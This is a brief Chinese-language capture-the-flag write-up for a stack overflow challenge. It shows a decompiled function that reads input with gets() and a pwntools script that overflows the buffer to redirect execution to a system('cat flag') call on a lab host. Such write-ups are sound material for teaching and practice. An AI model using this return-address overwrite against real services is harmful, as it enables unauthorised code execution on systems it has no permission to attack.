#

本题为栈溢出。

观察`vuln`函数。

```c
int vuln()
{
  int result; // eax
  char v1[76]; // [rsp+0h] [rbp-50h] BYREF
  int v2; // [rsp+4Ch] [rbp-4h]
 
  v2 = 0;
  result = gets(v1);
  if ( v2 == 2 )
    return system("cat flag");
  return result;
}
```

直接对`v1`进行溢出即可

```python
from pwn import *
p = remote("10.102.32.142",22019)
offset = 0x50+8
system_addr=0x401225
payload = b'a'*offset+p64(system_addr)
p.sendline(payload)
p.interactive()
```
